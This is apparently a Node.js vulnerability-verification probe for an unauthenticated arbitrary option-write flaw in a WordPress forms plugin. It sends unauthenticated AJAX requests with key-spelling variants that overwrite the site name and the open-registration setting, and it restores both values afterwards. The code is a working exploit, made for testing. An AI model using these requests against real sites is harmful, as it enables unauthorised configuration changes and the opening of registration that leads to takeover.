// Exploit-verification probe: Old Forms <= 1.4.2 unauthenticated arbitrary option update
// via the wp_ajax_nopriv_of_save_field action (no nonce, no capability check, no key allow-list).
//
// Usage:  node probe.mjs <base-url>      e.g. node probe.mjs http://127.0.0.1:8198
//
// Exit codes:
//   0  VULNERABLE     - at least one key-spelling variant of the arbitrary option write was observed
//   1  NOT VULNERABLE - no variant produced an observable option change
//   2  PROBE ERROR    - bad argument, target unreachable, or unexpected baseline (result unknown)
//
// Oracles (read-only, no users are created):
//   - blogname:           changed value is visible in the REST index (GET /?rest_route=/ -> "name")
//   - users_can_register: /wp-login.php?action=register returns 200 when enabled, 302 when disabled
//
// Only the base URL origin is contacted. Only blogname and users_can_register are written, and both
// are restored to their captured original values in a finally block.

import { randomBytes } from 'node:crypto';

const EXIT_VULNERABLE = 0;
const EXIT_NOT_VULNERABLE = 1;
const EXIT_ERROR = 2;

const TIMEOUT_MS = 10000;

// Key spellings to try. sanitize_key() lowercases and strips anything outside [a-z0-9_-],
// and wp_unslash() removes backslashes, so these reach the same option if the sink is still open.
const BLOGNAME_KEY_VARIANTS = [
  'blogname',
  'BLOGNAME',
  'BlogName',
  ' blogname',
  'blogname ',
  'blog\\name',
  'blogname\u0000',
];

const REGISTRATION_KEY_VARIANTS = [
  'users_can_register',
  'USERS_CAN_REGISTER',
  ' users_can_register',
  'users_can_register\u0000',
  'users\\_can_register',
];

function log(msg) {
  console.log(`[probe] ${msg}`);
}

function fail(msg, code = EXIT_ERROR) {
  console.error(`[probe] ERROR: ${msg}`);
  process.exit(code);
}

// ---- argument handling -----------------------------------------------------------------

const rawBase = process.argv[2];
if (!rawBase) {
  fail('usage: node probe.mjs <base-url>');
}

let base;
try {
  const u = new URL(rawBase);
  if (u.protocol !== 'http:' && u.protocol !== 'https:') {
    throw new Error('protocol must be http or https');
  }
  base = u.origin;
} catch (err) {
  fail(`invalid base URL "${rawBase}": ${err.message}`);
}

const AJAX_URL = `${base}/wp-admin/admin-ajax.php`;
const REST_INDEX_URL = `${base}/?rest_route=/`;
const REGISTER_URL = `${base}/wp-login.php?action=register`;

// ---- HTTP helpers ----------------------------------------------------------------------

function timeoutSignal() {
  return AbortSignal.timeout(TIMEOUT_MS);
}

// Sends the unauthenticated AJAX request. The response body is not trusted; the oracles decide.
async function saveField(key, value) {
  const body = new URLSearchParams({ action: 'of_save_field', key, value });
  const res = await fetch(AJAX_URL, {
    method: 'POST',
    body,
    redirect: 'manual',
    signal: timeoutSignal(),
  });
  await res.text();
  return { status: res.status };
}

async function getSiteName() {
  const res = await fetch(REST_INDEX_URL, { redirect: 'manual', signal: timeoutSignal() });
  if (res.status !== 200) {
    throw new Error(`REST index returned HTTP ${res.status}`);
  }
  const json = await res.json();
  if (typeof json.name !== 'string') {
    throw new Error('REST index did not include a "name" field');
  }
  return json.name;
}

async function isRegistrationOpen() {
  const res = await fetch(REGISTER_URL, { redirect: 'manual', signal: timeoutSignal() });
  await res.text();
  if (res.status === 200) {
    return true;
  }
  if (res.status === 302) {
    return false;
  }
  throw new Error(`unexpected HTTP ${res.status} from register page`);
}

// ---- restore helpers -------------------------------------------------------------------

async function restoreSiteName(originalName, preferredKey) {
  const keys = preferredKey
    ? [preferredKey, ...BLOGNAME_KEY_VARIANTS.filter((k) => k !== preferredKey)]
    : BLOGNAME_KEY_VARIANTS;
  for (const key of keys) {
    try {
      await saveField(key, originalName);
      if ((await getSiteName()) === originalName) {
        return true;
      }
    } catch {
      // try the next spelling
    }
  }
  return false;
}

async function restoreRegistration(originalOpen, preferredKey) {
  const keys = preferredKey
    ? [preferredKey, ...REGISTRATION_KEY_VARIANTS.filter((k) => k !== preferredKey)]
    : REGISTRATION_KEY_VARIANTS;
  for (const key of keys) {
    try {
      await saveField(key, originalOpen ? '1' : '0');
      if ((await isRegistrationOpen()) === originalOpen) {
        return true;
      }
    } catch {
      // try the next spelling
    }
  }
  return false;
}

// ---- probe logic -----------------------------------------------------------------------

async function main() {
  // Baseline: the oracles must work before a negative result means anything.
  const originalName = await getSiteName();
  const originalRegistrationOpen = await isRegistrationOpen();
  log(`baseline: blogname="${originalName}", registration open=${originalRegistrationOpen}`);

  let workingBlognameKey = null;
  let workingRegistrationKey = null;

  try {
    // Variant set 1: arbitrary write of blogname, checked through the REST index.
    for (const key of BLOGNAME_KEY_VARIANTS) {
      const marker = `ofprobe${randomBytes(6).toString('hex')}`;
      const res = await saveField(key, marker);
      let observed = false;
      try {
        observed = (await getSiteName()) === marker;
      } catch (err) {
        log(`  blogname via key ${JSON.stringify(key)}: could not read back (${err.message})`);
        continue;
      }
      log(`  blogname via key ${JSON.stringify(key)}: ajax HTTP ${res.status}, write observed=${observed}`);
      if (observed) {
        workingBlognameKey = key;
        break;
      }
    }

    // Variant set 2: arbitrary write of users_can_register, checked through the registration page.
    for (const key of REGISTRATION_KEY_VARIANTS) {
      const res = await saveField(key, '1');
      let observed = false;
      try {
        observed = (await isRegistrationOpen()) === true;
      } catch (err) {
        log(`  users_can_register via key ${JSON.stringify(key)}: could not read back (${err.message})`);
        continue;
      }
      log(`  users_can_register via key ${JSON.stringify(key)}: ajax HTTP ${res.status}, write observed=${observed}`);
      if (observed) {
        workingRegistrationKey = key;
        break;
      }
    }
  } finally {
    // Restore whatever this probe changed, comparing live state with the captured originals.
    const currentName = await getSiteName().catch(() => null);
    if (currentName !== null && currentName !== originalName) {
      const restored = await restoreSiteName(originalName, workingBlognameKey);
      log(`  restored blogname: ${restored}`);
    }
    const currentOpen = await isRegistrationOpen().catch(() => null);
    if (currentOpen !== null && currentOpen !== originalRegistrationOpen) {
      const restored = await restoreRegistration(originalRegistrationOpen, workingRegistrationKey);
      log(`  restored users_can_register: ${restored}`);
    }
  }

  if (workingBlognameKey !== null || workingRegistrationKey !== null) {
    log(
      `RESULT: VULNERABLE (blogname key=${JSON.stringify(workingBlognameKey)}, ` +
        `users_can_register key=${JSON.stringify(workingRegistrationKey)})`
    );
    process.exit(EXIT_VULNERABLE);
  }
  log('RESULT: NOT VULNERABLE (no arbitrary option write observed across all key variants)');
  process.exit(EXIT_NOT_VULNERABLE);
}

main().catch((err) => {
  fail(err.message);
});
